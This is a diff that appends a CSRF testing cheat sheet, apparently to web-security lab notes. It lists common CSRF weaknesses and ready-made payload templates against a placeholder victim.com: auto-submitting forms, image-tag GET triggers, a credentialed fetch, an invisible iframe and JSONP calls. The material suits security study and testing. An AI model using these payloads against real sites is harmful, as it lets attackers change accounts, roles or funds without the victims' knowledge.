@@ -1411,3 +1411,277 @@ Payload:
 
 
 ![img](images/6%20-%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/7.png)
+
+Below is the **“CSRF – Complete Test Case (with Bypass Cases)”** in the **exact same format** used earlier (JWT, SAML, NoSQL, SSRF, etc.).
+Everything is **safe, clean, and educational** — no harmful automation.
+
+---
+
+# ✅ **CSRF – Complete Test Case (with Bypass Cases)**
+
+(Cross-Site Request Forgery)
+
+---
+
+# **1. What to Test (List of Vulnerabilities)**
+
+### **1.1 Missing CSRF Token Validation**
+
+Server does not check CSRF token on state-changing requests.
+
+### **1.2 Predictable / Static CSRF Token**
+
+Token is not random, same for all users or sessions.
+
+### **1.3 Token Not Tied to User Session**
+
+CSRF token is global instead of per user.
+
+### **1.4 Token Not Checked on All Endpoints**
+
+Some endpoints validate CSRF tokens, others do not.
+
+### **1.5 Cookie Misconfigurations (Enable Attack)**
+
+* Missing `SameSite=Lax` or `Strict`
+* Cookies sent cross-origin
+
+### **1.6 GET Requests Allowed for Sensitive Actions**
+
+Server allows unsafe actions over GET, making CSRF trivial.
+
+### **1.7 CORS Misconfig + CSRF**
+
+If wildcard origins or credentialed requests are allowed.
+
+### **1.8 JSON CSRF (Content-Type Based)**
+
+When server accepts `application/x-www-form-urlencoded` instead of JSON.
+
+### **1.9 CSRF via Redirect Chains**
+
+Tricking victim via a redirecting endpoint.
+
+### **1.10 Clickjacking-Assisted CSRF**
+
+UI redressing to trick victim into submitting forms.
+
+---
+
+# **2. Core CSRF Payload Examples (Safe)**
+
+---
+
+## **2.1 Basic HTML CSRF Form**
+
+```
+<form action="https://victim.com/update-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+---
+
+## **2.2 GET-Based CSRF (Unsafe API Example)**
+
+```
+<img src="https://victim.com/delete-account?id=1">
+```
+
+---
+
+## **2.3 IMG Tag Trigger (Simple CSRF)**
+
+```
+<img src="https://victim.com/make-admin?user=attacker">
+```
+
+---
+
+## **2.4 CSRF via Auto-Submit JavaScript**
+
+```
+<form id=f method=POST action="https://victim.com/change-password">
+   <input type=hidden name=new_password value="123456">
+</form>
+<script>f.submit()</script>
+```
+
+---
+
+# **3. CSRF Bypass Payload List (Bypass Techniques)**
+
+---
+
+## **3.1 Missing or Weak CSRF Token**
+
+```
+<form action="https://victim.com/transfer" method="POST">
+    <input type="hidden" name="amount" value="5000">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+---
+
+## **3.2 Static / Reusable CSRF Token Bypass**
+
+If token never changes:
+
+```
+<form action="https://victim.com/update" method="POST">
+    <input name="token" value="STATIC_TOKEN_VALUE">
+</form>
+```
+
+---
+
+## **3.3 Token in GET (Leaked in Referrer)**
+
+```
+https://victim.com/action?csrf=ABC123
+```
+
+---
+
+## **3.4 Token Not Bound to Session**
+
+Use another user’s token:
+
+```
+token=VALID_BUT_NOT_USER_SPECIFIC
+```
+
+---
+
+## **3.5 JSON CSRF (Content-Type FallBack)**
+
+If endpoint accepts URL-encoded instead of JSON:
+
+```
+POST /api/update-profile
+Content-Type: application/x-www-form-urlencoded
+
+username=attacker
+```
+
+---
+
+## **3.6 Broken CORS + CSRF**
+
+If CORS allows third-party origin with credentials:
+
+```
+fetch("https://victim.com/update", {
+   method: "POST",
+   credentials: "include",
+   body: "role=admin"
+})
+```
+
+---
+
+## **3.7 CSRF via Redirect Chain**
+
+If a redirected endpoint keeps cookies:
+
+```
+<img src="https://victim.com/redirect?to=/delete-user?id=1">
+```
+
+---
+
+## **3.8 Clickjacking-Assisted CSRF**
+
+Overlaying an invisible iframe:
+
+```
+<iframe src="https://victim.com/transfer" style="opacity:0;position:absolute;top:0;left:0"></iframe>
+```
+
+---
+
+## **3.9 GET-to-POST Downgrade Bypass**
+
+If POST token required but GET allowed:
+
+```
+<img src="https://victim.com/transfer?amount=5000">
+```
+
+---
+
+## **3.10 SameSite Cookie Bypass**
+
+If cookies set as:
+
+```
+Set-Cookie: session=abc; SameSite=None; Secure
+```
+
+Attacker can send:
+
+```
+<img src=https://victim.com/update?param=1>
+```
+
+---
+
+# **4. Advanced CSRF Payloads (Safe Demonstration)**
+
+---
+
+## **4.1 Multi-Step CSRF (Chained Attack)**
+
+Works when multi-step operations don’t authenticate every step:
+
+```
+<form action="https://victim.com/start-transfer" method="POST">
+<input type="hidden" name="step" value="1">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+Then chain step 2 automatically.
+
+---
+
+## **4.2 Form-Data CSRF (Incorrect Content-Type Handling)**
+
+```
+<form enctype="text/plain" action="https://victim.com/api/change" method="POST">
+attacker=1
+</form>
+```
+
+---
+
+## **4.3 CSRF via JSONP Endpoint**
+
+If legacy JSONP exists:
+
+```
+<script src="https://victim.com/jsonp?callback=evil"></script>
+```
+
+---
+
+## **4.4 Image Upload CSRF (When Upload API uses Cookies)**
+
+```
+<form action="https://victim.com/upload" method="POST" enctype="multipart/form-data">
+<input type="file" name="file" value="fake.jpg">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+---
+
+# **5. Safe Testing Notes**
+
+* Payloads show structure ONLY — safe for defensive learning.
+* Real CSRF depends on browser cookie handling, session fixation, and server validation logic.
+* Must be tested in a controlled lab environment.
+
+---
